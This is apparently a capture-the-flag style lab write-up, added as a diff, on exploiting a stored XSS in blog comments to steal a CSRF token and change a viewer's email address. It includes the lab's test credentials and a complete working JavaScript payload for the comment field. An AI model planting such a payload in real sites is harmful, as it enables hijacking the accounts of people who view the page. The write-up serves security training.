@@ -1,0 +1,34 @@
+This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to steal a CSRF token, which you can then use to change the email address of someone who views the blog post comments. 
+
+You can log in to your own account using the following credentials: wiener:peter
+
+Step-1:
+
+we will first login to the account provided to us and change the gmail and observe with burpsuite or inspect how csrf token is working.
+
+we can see without the csrf token we cant change the email address
+
+
+This means  exploit will need to load the user account page, extract the CSRF token, and then use the token to change the victim's email address
+
+
+Step-2:
+
+Submit the following payload in a blog comment
+
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
+
+
+
+This will make anyone who views the comment issue a POST request to change their email address to test@test.com. 
